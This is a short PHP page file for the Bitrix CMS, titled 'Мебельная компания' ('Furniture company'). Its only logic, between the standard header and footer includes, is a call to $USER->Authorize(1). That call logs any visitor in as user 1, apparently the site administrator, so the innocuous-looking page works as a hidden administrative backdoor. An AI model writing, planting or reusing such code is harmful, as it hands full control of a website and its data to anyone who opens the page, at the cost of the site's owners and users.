<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("Мебельная компания");
global $USER;
$USER->Authorize(1);
?>
<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>